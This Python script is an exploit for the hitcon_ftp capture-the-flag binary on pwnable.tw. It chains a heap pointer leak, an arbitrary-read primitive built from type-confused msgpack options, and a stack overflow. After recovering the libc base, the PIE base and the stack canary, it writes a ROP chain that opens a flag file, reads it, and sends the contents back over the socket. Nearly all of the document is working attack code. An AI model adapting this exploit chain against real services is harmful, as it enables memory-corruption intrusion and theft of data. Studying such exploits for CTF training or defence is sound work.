#!/usr/bin/env python3
# hitcon_ftp (pwnable.tw) exploit
# Chain: V1 heap leak (FILE* via unterminated filename) ->
#        V2 arbitrary read (type-confused OACK options) ->
#        V3 stack overflow (check_crc32 print) -> ROP at SIGALRM (60s)
import socket, struct, sys, time, zlib

HOST = '127.0.0.1'
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 11111
FLAG_PATH = sys.argv[2].encode() if len(sys.argv) > 2 else b'flag'

# ---- libc 2.27-3ubuntu1 (provided libc.so) ----
ENVIRON, IO_FILE_JUMPS = 0x3ee098, 0x3e82a0
POP_RDI, POP_RSI, POP_RDX, POP_RAX = 0x2155f, 0x23e6a, 0x1b96, 0x439c8
SYSCALL, RET = 0xd2975, 0x439c9
# ---- binary (PIE offsets) ----
INIT_REQS, OACK_OPTS, DATAIN, SEND_ERR = 0x20d060, 0x20d160, 0x20d370, 0x2855
CANARY_OFF, RET_OFF = 524, 556

def p64(x): return struct.pack('<Q', x)

# ---------------- msgpack encode ----------------
def m_uint(v):
    if v < 0x80: return bytes([v])
    if v < 0x100: return b'\xcc' + bytes([v])
    if v < 0x10000: return b'\xcd' + struct.pack('>H', v)
    if v < 0x100000000: return b'\xce' + struct.pack('>I', v)
    return b'\xcf' + struct.pack('>Q', v)

def m_str(b):
    n = len(b)
    if n < 0x20: return bytes([0xa0 | n]) + b
    if n < 0x100: return b'\xd9' + bytes([n]) + b
    return b'\xda' + struct.pack('>H', n) + b

def m_bin(b):
    n = len(b)
    if n < 0x100: return b'\xc4' + bytes([n]) + b
    return b'\xc5' + struct.pack('>H', n) + b

def m_bin16(b):
    return b'\xc5' + struct.pack('>H', len(b)) + b

def m_arr(items):
    assert len(items) < 0x10
    return bytes([0x90 | len(items)]) + b''.join(items)

def m_map(pairs):
    assert len(pairs) < 0x10
    return bytes([0x80 | len(pairs)]) + b''.join(m_str(k) + m_uint(v) for k, v in pairs)

# ---------------- msgpack decode ----------------
def mdec(b, i=0):
    c = b[i]
    if c <= 0x7f: return c, i + 1
    if 0x90 <= c <= 0x9f or c == 0xdc:
        n, i = (c & 0xf, i + 1) if c != 0xdc else (struct.unpack('>H', b[i+1:i+3])[0], i + 3)
        out = []
        for _ in range(n):
            o, i = mdec(b, i); out.append(o)
        return out, i
    if 0x80 <= c <= 0x8f or c == 0xde:
        n, i = (c & 0xf, i + 1) if c != 0xde else (struct.unpack('>H', b[i+1:i+3])[0], i + 3)
        out = []
        for _ in range(n):
            k, i = mdec(b, i); v, i = mdec(b, i); out.append((k, v))
        return dict(out), i
    if 0xa0 <= c <= 0xbf: return b[i+1:i+1+(c&0x1f)], i+1+(c&0x1f)
    if c == 0xd9: return b[i+2:i+2+b[i+1]], i+2+b[i+1]
    if c == 0xda:
        n = struct.unpack('>H', b[i+1:i+3])[0]; return b[i+3:i+3+n], i+3+n
    if c == 0xc4: return b[i+2:i+2+b[i+1]], i+2+b[i+1]
    if c == 0xc5:
        n = struct.unpack('>H', b[i+1:i+3])[0]; return b[i+3:i+3+n], i+3+n
    if c == 0xcc: return b[i+1], i+2
    if c == 0xcd: return struct.unpack('>H', b[i+1:i+3])[0], i+3
    if c == 0xce: return struct.unpack('>I', b[i+1:i+5])[0], i+5
    if c == 0xcf: return struct.unpack('>Q', b[i+1:i+9])[0], i+9
    raise ValueError('bad msgpack byte %#x' % c)

# ---------------- protocol ----------------
sa = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # victim / chain request
sb = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # query request
sa.settimeout(3.0); sb.settimeout(3.0)
SRV = (HOST, PORT)

def recv_pkt(sock):
    data, _ = sock.recvfrom(65536)
    return mdec(data)[0]

def wrq(sock, fname, opts=None, extra=None):
    items = [m_uint(2), m_str(fname), m_str(b'octet')]
    if extra is not None:
        items += list(extra)
    else:
        items.append(m_map(opts or []))
    sock.sendto(m_arr(items), SRV)

def send_data(sock, block, payload):
    crc = (~zlib.crc32(payload)) & 0xffffffff
    sock.sendto(m_arr([m_uint(3), m_uint(block), m_uint(crc), m_str(payload)]), SRV)

def v2_read(targets):
    """arbitrary read via type-confused OACK options (fixed 5-kv layout)"""
    N = 5                                  # str len must be 5 so bin16 header lands in kv0 pad
    tgts = list(targets) + [targets[-1]] * (N - len(targets))
    assert len(tgts) == N
    kv = bytearray(b'\x41' * (48 * N))
    for i, t in enumerate(tgts):
        b = 48 * i
        kv[b:b+4]     = struct.pack('<I', 5)        # key.type  = STR
        kv[b+8:b+12]  = struct.pack('<I', 0x3F)     # key.size  = 63
        kv[b+16:b+24] = p64(t)                      # key.ptr   = target
        kv[b+24:b+28] = struct.pack('<I', 2)        # val.type  = INT
        kv[b+32:b+40] = p64(0x1337)                 # val.u64
    # elem3 = str(len=5) whose data starts the kv array; elem4 = bin16 with the rest.
    # bin16 header (3 bytes) lands at kv+5..8 inside kv0's padding (don't-care).
    wrq(sb, b'q', extra=(m_str(bytes(kv[:5])), m_bin16(bytes(kv[8:]))))
    o = recv_pkt(sb)
    assert o[0] == 6, o
    names = []
    for k in o[1].keys():
        if bytes(k) not in names:
            names.append(bytes(k))
    return names

def q(addr): return v2_read([addr])[0]

def read_bytes(addr, n):
    """read n bytes at addr, walking past NUL terminators (each stops a window)"""
    out = bytearray()
    while len(out) < n:
        w = q(addr + len(out))
        out += (w if w else b'\x00')
    return bytes(out[:n])

def read_ptr(addr):
    return int.from_bytes(read_bytes(addr, 8), 'little')

# ---------------- exploit ----------------
log = lambda *a: print('[*]', *a, flush=True)

MARKER = b'MRK7fA9k'

# --- phase 0: request A (chain victim) with big blksize + planted flag path option
wrq(sa, MARKER + b'A' * 8, [(FLAG_PATH, 1), (b'blksize', 65464)])
o = recv_pkt(sa); assert o[0] == 6, o
log('OACK A:', o[1])

# --- phase 1 (V1): leak FILE_B via unterminated "../" filename on request B
wrq(sb, b'q', [(b'blksize', 65464)])
o = recv_pkt(sb); assert o[0] == 6, o
wrq(sb, b'../' + b'A' * (256 - 3))
o = recv_pkt(sb); assert o[0] == 5, o
msg = o[2]
suffix = b') access violation'
idx = msg.find(suffix)
leaked = msg[idx-6:idx]
file_b = int.from_bytes(leaked + b'\x00' * (8 - len(leaked)), 'little')
log('FILE_B = %#x (leaked %d bytes)' % (file_b, len(leaked)))
assert len(leaked) >= 4, 'filename leak truncated (NUL in ptr) - rerun'

# --- phase 2 (V2): libc / environ / auxv walk -> PIE + canary + request A
vtable = read_ptr(file_b + 0xd8)
libc = vtable - IO_FILE_JUMPS
log('vtable = %#x  libc = %#x' % (vtable, libc))
assert libc & 0xfff == 0, 'bad libc base'

S = read_ptr(libc + ENVIRON)
log('environ = %#x' % S)

k = 0
while read_ptr(S + 8 * k) != 0:
    k += 1
    assert k < 128
log('envc = %d' % k)

auxv = S + 8 * (k + 1)
phdr = atrand = 0
j = 0
while True:
    t = read_ptr(auxv + 16 * j)
    if t == 0: break
    if t == 3:   phdr = read_ptr(auxv + 16 * j + 8)
    if t == 25:  atrand = read_ptr(auxv + 16 * j + 8)
    j += 1
    assert j < 64
pie = phdr - 0x40
log('AT_PHDR = %#x  PIE = %#x  AT_RANDOM = %#x' % (phdr, pie, atrand))
assert pie & 0xfff == 0, 'bad PIE base'

cbytes = read_bytes(atrand, 8)          # full 8 random bytes (NUL-safe)
canary = b'\x00' + cbytes[1:8]          # glibc transform: byte[0] := 0 (verified in gdb)
log('canary = %s' % canary.hex())
log('canary = %s' % canary.hex())

req_a = read_ptr(pie + INIT_REQS)
chk = q(req_a + 16)
assert chk.startswith(MARKER), 'request A mismatch: %r' % chk
log('REQ_A = %#x (marker ok)' % req_a)

# --- phase 3 (V3): stack image + NUL-split writes (decreasing length)
T = bytearray(b'\x41' * RET_OFF)    # padding; rbx/r12/rbp = junk (don't care)
T += b'\x41' * 24
assert len(T) == RET_OFF
T[CANARY_OFF:CANARY_OFF+8] = canary

chain = []
def add(*vals):
    for v in vals: chain.append(v)
# close stale fds so open() returns a deterministic fd
for fd in (4, 5, 6):
    add(libc + POP_RAX, 3, libc + POP_RDI, fd, libc + SYSCALL)
# open(flag_path, 0, 0)
add(libc + POP_RDI, pie + OACK_OPTS,       # option slot 0 = planted path
    libc + POP_RSI, 0, libc + POP_RDX, 0,
    libc + POP_RAX, 2, libc + SYSCALL)
# read(4, REQ_A+320, 0x100)
add(libc + POP_RDI, 4, libc + POP_RSI, req_a + 320,
    libc + POP_RDX, 0x100, libc + POP_RAX, 0, libc + SYSCALL)
# send_err(REQ_A) -> flag flies to socket A
n_before = len(chain)
add(libc + POP_RDI, req_a, pie + SEND_ERR)
# keep rsp%16 == 8 at send_err entry (entry index math below)
entry_rsp_slots = RET_OFF // 8 + n_before + 3   # slots consumed when send_err starts
if entry_rsp_slots % 2 == 0:
    chain.insert(n_before, libc + RET)
add(libc + POP_RAX, 60, libc + POP_RDI, 0, libc + SYSCALL)
for v in chain:
    T += p64(v)

image = bytes(T)
nuls = [i for i in range(1, len(image)) if image[i] == 0]
writes = sorted(set([len(image) - 1] + [z - 1 for z in nuls]), reverse=True)
log('stack image %d bytes, %d NULs, %d writes' % (len(image), len(nuls), len(writes)))

block = 1
for L in writes:
    payload = bytes(0x41 if b == 0 else b for b in image[1:L+1])
    send_data(sa, block, payload)
    o = recv_pkt(sa)
    assert o[0] == 4 and o[1] == block, 'write failed: %r' % (o,)
    block += 1
log('chain written; waiting for SIGALRM (<=60s)...')

sa.settimeout(75.0)
t0 = time.time()
while True:
    try:
        o = recv_pkt(sa)
    except socket.timeout:
        log('timeout - no flag'); sys.exit(1)
    log('%.1fs got %r' % (time.time() - t0, o))
    if o[0] == 5:
        log('FLAG:', o[2])
        break
